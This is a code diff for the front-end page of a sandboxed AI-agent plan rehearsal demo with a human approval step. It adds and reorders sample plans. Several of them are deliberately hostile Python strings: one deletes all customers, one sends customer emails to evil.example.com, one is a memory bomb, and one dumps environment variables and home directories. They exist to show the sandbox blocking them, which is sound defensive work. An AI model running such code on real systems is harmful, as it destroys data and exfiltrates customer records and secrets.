@@ -3,7 +3,7 @@
 import Link from "next/link";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { toast } from "sonner";
-import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
+import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, Lock, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
@@ -19,6 +19,7 @@ const EXAMPLES = [
 ];
 
 const BREAK_IT: { label: string; task: string; code: string }[] = [
+  { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
   { label: "✓ A correct refund plan", task: "Refund everyone who was double-charged last week and send them an apology email.", code: `def run(ctx):
     # Charged twice for ONE order = two charges sharing an order_id. Refund the extra charge.
     rows = ctx.db.execute("""
@@ -39,7 +40,13 @@ const BREAK_IT: { label: string; task: string; code: string }[] = [
         ctx.email.send(email, "A thank-you from Bean There",
                        f"Hi {name.split()[0]}, thanks for being one of our best customers. Use code BEANS10 for 10% off your next box.")
 ` },
-  { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
+  { label: "✓ VIP promo (respects unsubscribes)", task: "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.", code: `def run(ctx):
+    for email, name in ctx.db.execute(
+            "SELECT email, name FROM customers WHERE vip = 1 AND marketing_opt_in = 1").fetchall():
+        ctx.email.send(email, "A thank-you from Bean There",
+                       f"Hi {name.split()[0]}, thanks for being one of our best customers. Use code BEANS10 for 10% off your next box.",
+                       kind="marketing")
+` },
   { label: "Steal data", task: "Back up customers to our server", code: `import urllib.request, json\n\ndef run(ctx):\n    rows = ctx.db.execute("SELECT email FROM customers").fetchall()\n    urllib.request.urlopen("https://evil.example.com/upload", data=json.dumps(rows).encode())\n` },
   { label: "Memory bomb", task: "Cache everything", code: `def run(ctx):\n    blob = bytearray(2 * 1024 * 1024 * 1024)\n` },
   { label: "Read secrets", task: "Debug the environment", code: `import os, glob\n\ndef run(ctx):\n    ctx.log("env:", dict(os.environ))\n    ctx.log("home:", glob.glob("/root/*") + glob.glob("/home/*"))\n    open("/etc/stunt", "w").write("x")\n` },
@@ -69,6 +76,7 @@ export default function AppPage() {
   const [mode, setMode] = useState<"agent" | "break">("agent");
   const [code, setCode] = useState(BREAK_IT[0].code);
   const [breakTask, setBreakTask] = useState(BREAK_IT[0].task);
+  const [touchedMode, setTouchedMode] = useState(false);
   const [run, setRun] = useState<Run | null>(null);
   const [busy, setBusy] = useState(false);
   const [approver, setApprover] = useState("");
@@ -79,7 +87,7 @@ export default function AppPage() {
   const refreshBiz = useCallback(() => api.business().then(setBiz).catch(() => {}), []);
   useEffect(() => {
     refreshBiz();
-    api.health().then(setHealth).catch(() => {});
+    api.health().then((h) => { setHealth(h); if (!h.inference_configured) setMode((m) => (touchedMode ? m : "break")); }).catch(() => {});
   }, [refreshBiz]);
 
   // Deep link: /app?run=<id> opens a past run (from History).
@@ -178,7 +186,7 @@ export default function AppPage() {
         <>
           <span className="hidden items-center gap-1.5 rounded-full border px-3 py-1 font-mono text-[11px] text-muted-foreground lg:inline-flex">
             <span className={cn("size-1.5 rounded-full", health?.inference_configured ? "bg-foreground" : "bg-damage")} />
-            {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : health.sandbox_runtime}` : "connecting…"}
+            {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : `${health.sandbox_runtime} (dev, no gVisor)`}` : "connecting…"}
           </span>
           {run ? <Button variant="outline" className="h-8 rounded-full px-3" onClick={() => setRun(null)} disabled={running}>New</Button> : null}
           <Button variant="outline" className="h-8 rounded-full px-3" onClick={reset} disabled={busy || running}><RotateCcw className="size-3.5" /> Reset demo</Button>
@@ -209,7 +217,7 @@ export default function AppPage() {
           </div>
 
           <div className="rounded-2xl border bg-card p-5">
-            <Tabs value={mode} onValueChange={(v) => setMode(v as "agent" | "break")}>
+            <Tabs value={mode} onValueChange={(v) => { setTouchedMode(true); setMode(v as "agent" | "break"); }}>
               <TabsList className="w-full">
                 <TabsTrigger value="agent" className="flex-1"><Sparkles className="size-3.5" /> Ask the agent</TabsTrigger>
                 <TabsTrigger value="break" className="flex-1"><Ban className="size-3.5" /> Break it yourself</TabsTrigger>
@@ -235,7 +243,10 @@ export default function AppPage() {
                     <button key={b.label} onClick={() => { setCode(b.code); setBreakTask(b.task); }} className={cn("rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", code === b.code && "border-foreground text-foreground")}>{b.label}</button>
                   ))}
                 </div>
-                <Textarea value={code} onChange={(e) => setCode(e.target.value)} rows={7} spellCheck={false} className="resize-none font-mono text-[12.5px]" />
+                <label className="block text-xs text-muted-foreground">Request the plan is judged against
+                  <input value={breakTask} onChange={(e) => setBreakTask(e.target.value)} maxLength={300} className="mt-1 h-9 w-full rounded-lg border bg-background px-3 text-sm text-foreground outline-none focus-visible:ring-2 focus-visible:ring-ring/50" />
+                </label>
+                <Textarea value={code} onChange={(e) => setCode(e.target.value)} rows={9} spellCheck={false} wrap="off" className="max-h-60 resize-none overflow-auto font-mono text-[12.5px] [field-sizing:fixed]" />
               </TabsContent>
             </Tabs>
             <Button className="mt-4 h-11 w-full rounded-full text-[15px]" onClick={start} disabled={busy || running || (mode === "agent" ? task.trim().length < 3 || health?.inference_configured === false : code.trim().length < 10)}>
@@ -247,7 +258,7 @@ export default function AppPage() {
             <div className="rounded-2xl border bg-card p-5">
               <div className="flex items-center justify-between gap-3">
                 <div className="text-sm font-medium">Timeline</div>
-                <span className={cn("rounded-full border px-2 py-0.5 font-mono text-[11px]", ["drifted", "failed"].includes(run.status) && "border-damage/40 text-damage")}>{STATUS_LABEL[run.status]}</span>
+                <span className={cn("rounded-full border px-2 py-0.5 font-mono text-[11px]", (["drifted", "failed"].includes(run.status) || (run.status === "review" && critical)) && "border-damage/40 text-damage")}>{run.status === "review" && critical ? "Blocked: cannot be approved" : STATUS_LABEL[run.status]}</span>
               </div>
               <ol className="mt-4 space-y-3">
                 {run.events.map((e, i) => (
@@ -276,7 +287,7 @@ export default function AppPage() {
               <ol className="mt-6 space-y-3">
                 {[
                   { n: "1", t: "Break it", d: "Rehearse a plan that deletes every customer. Watch it hit only the double, and see approval locked.", go: () => { setMode("break"); setCode(BREAK_IT.find((b) => b.label === "Delete every customer")!.code); setBreakTask("Clean up the customer table"); } },
-                  { n: "2", t: "Approve a good one", d: "Pick “A correct refund plan”, rehearse it, approve it. 104 real refunds and emails go out.", go: () => { setMode("break"); setCode(BREAK_IT[0].code); setBreakTask(BREAK_IT[0].task); } },
+                  { n: "2", t: "Approve a good one", d: "Pick “A correct refund plan”, rehearse it, approve it. 104 real refunds and emails go out.", go: () => { const b = BREAK_IT.find((x) => x.label === "✓ A correct refund plan")!; setMode("break"); setCode(b.code); setBreakTask(b.task); } },
                   { n: "3", t: "Ask the agent", d: "Give the AI the double-charge request and see whether Stunt Double catches its plan.", go: () => { setMode("agent"); setTask(EXAMPLES[0]); } },
                 ].map((s) => (
                   <li key={s.n}>
@@ -317,7 +328,8 @@ export default function AppPage() {
 
               {run.attempts.length > 1 ? <AttemptCompare attempts={run.attempts} /> : null}
 
-              <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : "Approval required"}>
+              <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : run.status === "failed" ? "Failed" : critical ? "Blocked by policy" : "Approval required"}
+                applied={run.status === "applied" && run.apply_result ? `Done. This refunded ${usd(run.apply_result.refund_total_cents ?? 0)} across ${num(run.apply_result.refunds ?? 0)} charges, delivered ${num(run.apply_result.emails_sent ?? 0)} emails and wrote ${num(run.apply_result.rows_written ?? 0)} rows, after the drift check${run.approval ? `. Approved by ${run.approval.approver}` : ""}.` : undefined}>
                 {run.status === "review" ? (
                   <>
                     <Button variant="outline" className="h-10 rounded-full px-4" onClick={() => act("reject")} disabled={busy}><X className="size-4" /> Reject</Button>
@@ -325,7 +337,7 @@ export default function AppPage() {
                     {!critical ? <input value={approver} onChange={(e) => setApprover(e.target.value)} placeholder="Your name (for the audit trail)" maxLength={80}
                       aria-label="Approver name" className="h-10 min-w-0 flex-1 rounded-full border bg-background px-4 text-sm outline-none focus-visible:ring-2 focus-visible:ring-ring/50 sm:ml-auto sm:max-w-[240px]" /> : <span className="sm:ml-auto" />}
                     <Button className="h-10 rounded-full px-4" onClick={() => act("approve")} disabled={busy || critical || !attempt?.consequences.ok}>
-                      <Check className="size-4" /> {critical ? "Blocked by policy" : "Approve and apply"}
+                      {critical ? <><Lock className="size-4" /> Blocked by policy</> : <><Check className="size-4" /> Approve and apply</>}
                     </Button>
                   </>
                 ) : null}
